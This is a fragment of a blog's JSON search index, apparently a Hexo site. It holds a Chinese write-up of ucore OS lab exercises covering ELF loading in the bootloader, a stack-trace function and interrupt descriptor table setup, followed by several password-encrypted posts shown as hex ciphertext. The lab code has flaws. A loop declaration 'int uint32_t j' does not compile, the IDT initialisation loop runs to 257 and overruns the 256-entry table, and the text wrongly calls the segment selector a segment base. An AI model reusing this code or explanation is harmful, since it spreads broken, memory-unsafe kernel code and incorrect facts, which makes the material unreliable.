class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    readseg((<span class=\"keyword\">uintptr_t</span>)ELFHDR, SECTSIZE * <span class=\"number\">8</span>, <span class=\"number\">0</span>);<span class=\"comment\">//从磁盘中读取第一页数据</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> bad;</span><br><span class=\"line\">    &#125;<span class=\"comment\">//判断是否为有效elf</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">proghdr</span> *<span class=\"title\">ph</span>, *<span class=\"title\">eph</span>;</span></span><br><span class=\"line\">    <span class=\"comment\">// 加载每个程度的段</span></span><br><span class=\"line\">    ph = (struct proghdr *)((<span class=\"keyword\">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class=\"line\">    eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; ph &lt; eph; ph ++) &#123;</span><br><span class=\"line\">        readseg(ph-&gt;p_va &amp; <span class=\"number\">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  \t<span class=\"comment\">//跳转到程序入口点</span></span><br><span class=\"line\">    ((<span class=\"keyword\">void</span> (*)(<span class=\"keyword\">void</span>))(ELFHDR-&gt;e_entry &amp; <span class=\"number\">0xFFFFFF</span>))();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"练习五实现函数调用堆栈跟踪函数\">练习五：实现函数调用堆栈跟踪函数</span></h2><p>通过函数print_stackframe来跟踪函数调用堆栈中记录的返回地址。</p>\n<p>（四舍五入相当于一个dbg系统）</p>\n<p>从0 - 栈长，分别打印ebp，rip以及对应的代码信息。</p>\n<p>读取ebp和eip的函数已经给出，并且对应的数据类型都已经设置好。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-21%20%E4%B8%8B%E5%8D%884.47.26.png\" alt=\"截屏2022-07-21 下午4.47.26\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">print_stackframe</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">     <span class=\"comment\">/* LAB1 YOUR CODE : STEP 1 */</span></span><br><span class=\"line\">     <span class=\"comment\">/* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span></span><br><span class=\"line\"><span class=\"comment\">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</span></span><br><span class=\"line\"><span class=\"comment\">      * (3) from 0 .. STACKFRAME_DEPTH</span></span><br><span class=\"line\"><span class=\"comment\">      *    (3.1) printf value of ebp, eip</span></span><br><span class=\"line\"><span class=\"comment\">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (unit32_t)ebp +2 [0..4]</span></span><br><span class=\"line\"><span class=\"comment\">      *    (3.3) cprintf(&quot;\\n&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</span></span><br><span class=\"line\"><span class=\"comment\">      *    (3.5) popup a calling stackframe</span></span><br><span class=\"line\"><span class=\"comment\">      *           NOTICE: the calling funciton&#x27;s return addr eip  = ss:[ebp+4]</span></span><br><span class=\"line\"><span class=\"comment\">      *                   the calling funciton&#x27;s ebp = ss:[ebp]</span></span><br><span class=\"line\"><span class=\"comment\">      */</span></span><br><span class=\"line\">    <span class=\"keyword\">uint32_t</span> ebp = read_ebp();  <span class=\"comment\">//(1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span></span><br><span class=\"line\">    <span class=\"keyword\">uint32_t</span> eip = read_eip();  <span class=\"comment\">//(2) call read_eip() to get the value of eip. the type is (uint32_t);</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; STACKFRAME_DEPTH; ++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cprintf(<span class=\"string\">&quot;ebp : 0x%x&quot;</span>,ebp);</span><br><span class=\"line\">        cprintf(<span class=\"string\">&quot;eip : 0x%x&quot;</span>,eip);<span class=\"comment\">//分别打印eip和ebp的值</span></span><br><span class=\"line\">        <span class=\"keyword\">uint32_t</span>* args = (<span class=\"keyword\">uint32_t</span>*)ebp + <span class=\"number\">2</span>; <span class=\"comment\">//接着打印对应的参数</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> <span class=\"keyword\">uint32_t</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; ++j)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            cprintf(<span class=\"string\">&quot;args: 0x%x\\n&quot;</span>,args[j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        print_debuginfo(eip<span class=\"number\">-1</span>);<span class=\"comment\">//这里就是打印类似kern/debug/kdebug.c:306: print_stackframe+37的信息</span></span><br><span class=\"line\">        eip = *((<span class=\"keyword\">uintptr_t</span>*)ebp + <span class=\"number\">1</span>);<span class=\"comment\">//设置新的eip为ebp+1处的地址</span></span><br><span class=\"line\">        ebp = *(<span class=\"keyword\">uintptr_t</span>*)ebp;<span class=\"comment\">//设置新的ebp</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"练习6完善中断初始化和处理\">练习6：完善中断初始化和处理</span></h2><h4><span id=\"中断描述符表也可简称为保护模式下的中断向量表中一个表项占多少字节其中哪几位代表中断处理代码的入口\">中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</span></h4><p>在<code>mm/mmu.h</code>中可以看到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Gate descriptors for interrupts and traps */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">gatedesc</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_off_15_0 : <span class=\"number\">16</span>;        <span class=\"comment\">// low 16 bits of offset in segment</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_ss : <span class=\"number\">16</span>;            <span class=\"comment\">// segment selector</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_args : <span class=\"number\">5</span>;            <span class=\"comment\">// # args, 0 for interrupt/trap gates</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_rsv1 : <span class=\"number\">3</span>;            <span class=\"comment\">// reserved(should be zero I guess)</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_type : <span class=\"number\">4</span>;            <span class=\"comment\">// type(STS_&#123;TG,IG32,TG32&#125;)</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_s : <span class=\"number\">1</span>;                <span class=\"comment\">// must be 0 (system)</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_dpl : <span class=\"number\">2</span>;            <span class=\"comment\">// descriptor(meaning new) privilege level</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_p : <span class=\"number\">1</span>;                <span class=\"comment\">// Present</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> gd_off_31_16 : <span class=\"number\">16</span>;        <span class=\"comment\">// high bits of offset in segment</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>一个gatedesc的大小8 byte。</p>\n<p><code>gd_off_15_0</code>和<code>gd_off_31_16</code>指定了段偏移，<code>gd_ss</code>制定了段基址，这三个成员共同确定了中断处理程序的地址，作为中断处理代码的入口。</p>\n<h4><span id=\"请编程完善kerntraptrapc中对中断向量表进行初始化的函数idt_init-在idt_init函数中依次对所有中断入口进行初始化-使用mmuh中的setgate宏填充idt数组内容-每个中断的入口由toolsvectorsc生成使用trapc中声明的vectors数组即可\">请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</span></h4><p>setgate函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// kern/mm/mmu.h</span></span><br><span class=\"line\"><span class=\"comment\">/* *</span></span><br><span class=\"line\"><span class=\"comment\"> * Set up a normal interrupt/trap gate descriptor</span></span><br><span class=\"line\"><span class=\"comment\"> *   - istrap: 1 for a trap (= exception) gate, 0 for an interrupt gate</span></span><br><span class=\"line\"><span class=\"comment\"> *   - sel: Code segment selector for interrupt/trap handler</span></span><br><span class=\"line\"><span class=\"comment\"> *   - off: Offset in code segment for interrupt/trap handler</span></span><br><span class=\"line\"><span class=\"comment\"> *   - dpl: Descriptor Privilege Level - the privilege level required</span></span><br><span class=\"line\"><span class=\"comment\"> *          for software to invoke this interrupt/trap gate explicitly</span></span><br><span class=\"line\"><span class=\"comment\"> *          using an int instruction.</span></span><br><span class=\"line\"><span class=\"comment\"> * */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SETGATE(gate, istrap, sel, off, dpl) &#123;            \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_off_15_0 = (uint32_t)(off) &amp; 0xffff;        \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_ss = (sel);                                \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_args = 0;                                    \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_rsv1 = 0;                                    \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32;    \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_s = 0;                                    \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_dpl = (dpl);                                \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_p = 1;                                    \\</span></span><br><span class=\"line\"><span class=\"meta\">    (gate).gd_off_31_16 = (uint32_t)(off) &gt;&gt; 16;        \\</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">idt_init</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">extern</span> <span class=\"keyword\">uintptr_t</span> __vectors[];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"comment\">//step 1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">257</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        SETGATE(idt[i],<span class=\"number\">0</span>,GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class=\"line\">        <span class=\"comment\">//第一项为对应gate，第二项“1”为trap gate，“0”为interrupt gate</span></span><br><span class=\"line\">        <span class=\"comment\">//第三项为段选择子，选择interrupt或trap handler</span></span><br><span class=\"line\">        <span class=\"comment\">//第四项为段偏移，此处为中断处理程序的入口地址，存放于__vectors[]。</span></span><br><span class=\"line\">        <span class=\"comment\">//第五项为特权级描述符，表明唤醒中断/trap gate的软件的特权级。</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//step 2</span></span><br><span class=\"line\">    SETGATE(idt[T_SWITCH_TOK], <span class=\"number\">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</span><br><span class=\"line\">    <span class=\"comment\">//将从用户态转为内核态的中断特权级设置为user</span></span><br><span class=\"line\">    <span class=\"comment\">//step3</span></span><br><span class=\"line\">    lidt(&amp;idt_pd);<span class=\"comment\">//加载idt表到cpu</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["ucore"]},{"title":"七月","url":"/2022/07/16/vivi_2022%E5%B9%B4%E4%B8%83%E6%9C%88/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"3b279426cfa8465fb06213052d7b2fa86451edff6bb6f62f127d9ca65e0a53b5\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf556ee354e8dbf1d78ab614e66e3d4677793e225f5381a8a86ad7437ba85c27e2ee7f057cd9b3437ce143889b4012080e9165e44c74da4ddf144d69ec467a78f934c279254345b149d897e82cbf8a1000991819e8a27405343981e4d4b4af4214487ddaec9bc1b2935d37b7d36d9db775ccf9b64982b2abb78a275a42e1d41e98dbf8e13e539cb5cbce85e861ab76b0d93fe35f9ae235b5ec9f3fe7cc93b3116c3cbd7067b51467179991389bf5212a614c1468e9eb664555cf2366c420830e6bf0b2211a27aa89e22da7e93be642fc0bb28257049066a22b3756ba573f40767edd05d9e73617700c415ce2366db8c555237af81b0d7cfaa81e88f667243ef68a02d9e1c8c6be90e522b05985767f2f6153bef44190cf52f1e6db40f48eebd2e1f43fc1141cd5b896939c2f1f370f6717cf529394c15effff993128af07a7621e84c2b2b981ef7a2eca384679ee4296f680b2a66af410c252fdebdf071ad0f4d613826d04004facd385f0bf20118445c554cb08f9d0350a482f6991b728da357e1727315f88fc88d26f4b74f3532968bd8d67e354efa946b83c800d6ebdd329bec17516ac08aa331e855f4dd839a8b6076135b8c8a25decb32b64d611675bfe21a8543c687bd25fcd33858a88b130739f5abef42e25a8af9c056c343206f9d47deebab1a8d4b9a15ddcfd628dcf5857ab179992f38ad365eeae330306ffd2d508986c0d9b1429df3b21f46ca4b3760657967354d8591ccae36f555439d806504ffada8cbf46b9882ae100fddda81976569a7738d5121a2a5d3a8f533e0e2a95777651ef9d68bc622029a1bf8202a575fc4bdfba79cddb1d31f6a7b9d1bff64ae9a0a462a41ce66b5e57ae79039dd28c6bea0e7eff06ed03750c8b34594b94bc1e183b0a34b0e4b508e3d4e1bf76aee7408176ba33d41856426db3a583c45f8aa3e1208a9800316f48147696857097f9a1509fdcd88f1971721e2ef4e1c1724a8d82395dbfaca99ac46d47d03176738ce3c5d9647aa8fc0275ac2b109e4a9ec1b761a480f3cb66eb1cef40769ad4d6193f3b2738f07d955c277f17a4212f689dd3e6a6fdacb852704395386baa38b71fadbec9ed8224b87ad8fdb18372af5d01ecd9a07fc8953edba7f564f189a3af0dbcf92d3d91f2960fa63edcf2d26c2c07deba05df37dc6230bf99df63ea5bae49f2f1f03d1cf7feef3eb8da22cb92ad780cbcee7c545406f8c5a9e1a1349269c9a28b5b861d1196ce31a3afb4b064b981196e631599dfa1c809602127e5b9aee6d0a62f87f143f0e026e7d735a30ab42e4f8e25f505fe65202d7dba4f1602021486c99cfebc38331d2dd34d6fe814651f32ce8588a2978595d50d69de31efeb349382361002a1678245b3a123e0db024d35340d3f3da26be57809513baa781cf222427c60b4a575dbee32c33f95195bbda4593c4118f4f94b0212b5c8c133fe164862bc39e7ca6341032fb77e40c8ba36503eebe8f6e790d5042932da028fe4d047d5b3a557bf01f84669d5748ae248fff6fc5145514c968ee251c4a4458e8288af34e74eb28d9ef0742b85dfbc8ea5eadebb0c3349adf526ccc4c2046d29f53c5cee0c802c50f2ed041d234da0f2d81917d265cac37bcecd2f443d9035e0546b7163e832008f6f00f6826978107a00c08b8767785c594556538519503434ab0e4fa7c208ab033a9bfb1cecfacc11c0646fb119e848749d043a21e13f792b6527d77e6f210e71c78811a173758e8cff4ac9c6cf87893a5a060705c14e61bf5c1c637ec7d30b2024b73d55ba967c4d778f5107dd2b0704597b62da8be2f44af989441096e786b04e9c0ecd5ad2df1e9121f502363a453919de5157cc131856d2b22fead0bd44c2efd675df9cacb6615712ea9c3d5d3de458589c5ea7879bee257e79c8af994de781d73b12a800cce638fde1fec2a7744eeca07373a2d6c01632bb482</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["vivi"]},{"title":"三月","url":"/2022/04/13/vivi_2022%E5%B9%B4%E4%B8%89%E6%9C%88/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"6060a2b4fe604427f36c755007c9968ca4cc9a66331b45667507c7d09c0358e7\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf5924955be49a19ed08f9194f97658d3c827997b07d0290ba06b3af5acc3cf9e69a158873cf7790cc79358be0830bb596f6315fdf78e41e520e57282edd7eea23935738b11af891816b9fdd6ade003e4f144bdc08ddce87f176c2b5cb1ba41bd1aa142987a2c2f6932832e44e2b7f81e50a2e40733354120ef03f78b43249f0553fead8018bfa8ff8ee1498fc5d839dffca3568624c26aef611b7e6c313e38c473f517f725abc290e6f8baec9493b943d501e0f50f4b7d80bdde95c9564f727818a9ee87d240eb3e2eaefe2122324e2d783c05d975bcf566496fc5b950c8f25cab512fdcdb5d42ae758b3ee668bb8168ec9e5b5ad717daeda8ea7a024eb13e28008e07fbb8db3ac5441d4d8ef91587cf59bc829e90c613ca70b516e6a63b299a5259f2a1ed67b12062705708577d68c0c8cb40a36b5c4238d79ba1c8ad6d808dd631b8b4d0bdee810d139ba7e63628242fa9c208c62a8e73fa2bc3112c3e1d93c8321ac00ee14ca1172c2b739502269371a293b6e6e064201d247f212bf936f56311a0452416f5fca062a4227408fbbc8eb3e4022d91b68ea03283485f2f496551d288925ebf41299a0f6f566b166c24546fd2bfee5a01116340ab7ce724873b6db7a9b363430b61b1b2e252b4e11a108566b3c1ad32f196203cb79b763f54d6385f5fd372bf77ea2b28c2a2a3ecbbdcd36f0099a14847465ad38ade5e9ad99ced25c27decbe42101e301158377ae268a3abd38be756f7a3c277eb38cd8d66e65ea468de890cd2f44cd30c5e125215180d9e1b1a1c799a0f7844b9a2da18cd34d4ec7037ed9d613f285821cf727084f9217c919781faddf94bc5ca2d00404926e60cd28e0341b26a43f93c1a0b8a0d7c311fea689224f7796990d4d11c17cca61b3b9df1bedd5e2f6ed229fa78b9499b5b8bb600442c98083323639e6b0846ae000c1af72059ce5b08d57172bd0c96457905947d25852fc5a243e6d4cbec9af4e599a821be2cb9947ad4e23c5125088450165b0efe965445ad8ccca7b07019dadede932eb8d4a5c17070ed4684101f10e684911cee131a0417754da49188d613a93a5aa92874604c1de533817632a2a91bcd939d428984512711b156c60181282241853280d44959485a3141689e302c275c21062d8d65d860bd7c9435d2e64f92d700b944efbce87d6f62e0f86daa791c74d10063830268d5977a6b520ed1a041417c30f25c733cbdb7b95a69d319eb35d065f6321d9f3ea8751a3ce07ac3f031b2a947cfd87ca4761b134d517e60c9c00793d3fdffecb146f784f3278267d56b507a59539984481fbb296cbf65838423bf7541465f21c51571e7af1cd13e8ca107b4f708d05ede3be8cdc1cd66aebce580af72795a52e9f517d0ee74a255ba1fe96ca211ec094a8d4e8b11e7d1f38bd84bde2416e9c375a07abe0b0762081487775774c340e364e6f2df02955d0398753794b4f081b686e542a8ef2cefae51f80fd6b7daf4dbe53071e263cd7b58876d3ee9a7f3ac9ea4f0c65ebcb1d6f5566cfab42e8aab4f724419e6517fdf660c1f154051ac0967294bf68bc2e0befd853480d3d4e0eee551e5236f1da652a8abca7259358a6b105d5fe515aac18bdb7dbd103e44c50e0f31ea3a2456aab42af75223ddcc026051b77f29e86bf0e2d9321c1576f6ba49a48233d95e693dded0f5fe82dd91ba5dfc83ac5a0493e3d5795e147ee0e7583285e076d3059d4ccc1e5ed2601cf65aaa77420d4eed7ddf9dc588ac1fd8feffda5f7633b2d68259ba4b5b120f807c8a9d5e2d0fe9257c5b0f8a16c9477543581231d328c10b5b806baeb8e96bf06e04db7f3a817ec4791253d19af1df4c077ea409a173b391e2499c71ac31b2966f481670c851b21d9c8403c8586f8b18e74241dea2d2e947d4f195d04241bba0039b15c357eb08619e92c6fdbc622e849c383dde7364df943db650264ce2823dab4778718275022302201de2d376d7a8e712f1859bed66e00cadd015015b76ddb8aaa1a8b81e89f8f3d3f6612bfbfc25fd35465045411471ab625b9a5e97bf2465690ba07ee6dc12b82cd83763bd8eacfbe5a803461f889bde1bb98c7e4f3383e84d97d99d0f226e446ef14cbd9dc9f25933b1ccb608764fdf4761de7fac794a924102b9a975a634a533541b1afa4bd40b6fe55bb2beebca60d3032c5359a448a3240890514adb124db3d08248859049e5a1d2ee91d2b6790cdbb9c96ce66d1375492462c0ce9db04edcef52aaa77d3ed6ed79c3d91d68cf8f5e4796671a0d37306d0edd9497e48eacfc0b5d4b3d2c9bcb92c48a6ab80d7bd3237e4040c10b25094b6efa5c64282ffaea46288d6cde4dbba095473b7851719f5a1392be610794b79a130c04ec9c23531fb9e11bb220df10a299a3c6df1130fe228a108b099b6b31fe5597a47c48fc594f27537d3bf911dd3173dfd536960d9d36747b022458daa32c09a816ee6771074c29ff87bf46d1f56b591c91f78d5d4c9687f623d41b3e60c20312637c7c95b21e57ddaad584d5202110d343e52bf5db49d87c4fbf75a4413a211a0d80d74b04e6ed2f7964511a5732ac384d617fcb4840b8b912514542c1a2a00c912670f9c18c700bd0c37e1afeac9d91d2782760227c69bbf06cc3c77bb9855d8c838e0d3a97fd9b704b80e03378cafb380074a137db8692fdaff84332a013c7a64af405eb47e039b06f04152414da4d8bf308cc2195b54a83aeb624262d53909feacf88541374dab983ae20524b64bdedc1c4749d98a6d4e8220f3bde14130a431e1e141355c387f786d3dd8647db8d98292fa20cba7cab3a3d525a2d14b216bfe344897a5031652c69ea90c59099e2e181542db540fc99fbf07c3973fd729f7e7e84cbe63fabbf32a43fc42a9fffb99dca0b5f8d948ccce259947e68d0940a86a236aa3acc1a38a5b04b1bdacf93a76543ccffe61d872460f5904fe64bf77947e39f5d2e5b680f46b18e1bbfa7bb8aa5533c319182ec587650bb7a5a80100572e3c7b14f57b0376db3e49c68eeef7235b0d73a083754226eca733cbd6ef9b89a3a2a53ede48da27360ba216533c93294beea2094e800137b7c0fa3684cb10f1cdbf8fdce00f1490377c7bb1c384c9ca8b3977d71801b8d8b368c49e2d5e7a213e7d996f1f2d7d7c3853151e931557ca7adac67df4adc8c6e2abf74d1e56b41d37e9a0584468b949e78115a1c8391f7c722cffb8c22b062f9b8822a177b1c6b2c6f325125207d3e0b033fad365ebe62b54e3bb1e3b7ec85a6409eec83781da36dc52afd6804802d843521e27db125436c7b25dfd4dd9c0d4f48f42744b7c97af824b7d3f4a4c0489b70f3059cf81b0650e254bba5ebf3dd03278c0c44e20cd63e08883b194652e31a0fef199e54d7092e313a565badd3618a3733ce0bf59fd5241ee1cce5dd0a8a5982de847f9513d4b596383b41c7eab57291</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["vivi"]},{"title":"六月","url":"/2022/07/07/vivi_2022%E5%B9%B4%E5%85%AD%E6%9C%88/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"4491a8d507a470c533c0cb2a09cfb4c55217a97ecbc2e785046b6047c57529c7\"></script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["vivi"]},{"title":"十月","url":"/2022/10/01/vivi_2022%E5%B9%B4%E5%8D%81%E6%9C%88/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"50c6ab4b2b0002db4abec6e90a639e84c1014513acf7d65e5b6b845ef0ced649\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf5924955be49a19ed08f9194f97658d3c8f80178caa24f0eae7755131e1266180d9b715d8be49025ef73a60a5fb03242596cd3bd7b21ab3466852b05937e39567756932b5b901b66538cd502b52b3c816312d25d4496b0a9669ba4697083f62e2d8dd5e715669ba1686f69c9873975143a237821e7285de6ac764654e53745ffe091b94194a02a74d5d3423457dfdb47b3702fc932105fad660d3920f536b18d9797be826f5b58d0c23d02ab45af11c712902625516ee7f1d7d67ac50a5293e6ac6bac6859a0e212039d9d86a470d89551ae868751554fc1d376a575a55c767fa468bb548f7f85b5bb282fe3449fa94604b2fc9781de20e5230a7f5a400ace1ceaeb6e050ae8638c634470ee1bfbe1a786d86a7078e8073be3af2b2623f67903087cd0764c60eb6d43b0320fd012a0df68b3fcfe949e5f1715ad97fbd6cb4839732eef73af4ae2b1cf509b85bc2cce721eb9ff08e9b177da990b75032ac064957603c62d1de9169c4cf0ad726773283cb55f91ec8aa291169b9bb7be8b3914e8311b3f92efa0e42d4e846e26f35c5534a4b5446dae3926c2d03e7ac6ae0515d6647eea426337b03168248b96c5215b172dd27ab907cfc993f37b00fa0597d48954f6967c1d713f8588f4192b51704711bbd08bb1e970338d9229e5dca85fd498966af9c6d39321609bd9a564720921b384c50a699fc6335c8cdbf54de6a58c8b181f5cf8e5f924afe72a15e10d233bebf7c9df2c6c8d7442564d3fc7a4f93b70d1903f6903c9d5e4dce9940472bd5b0e4e9ad81f520d7cdf5cdd14978b5cac259c7c140427d78c533cae9b5329b604015f18790e48ed2c2331a6eb781ad5afeec3b6c3a6bf5377e29f462cfce8dc546d57f0ccae04a4c4c7fe9bf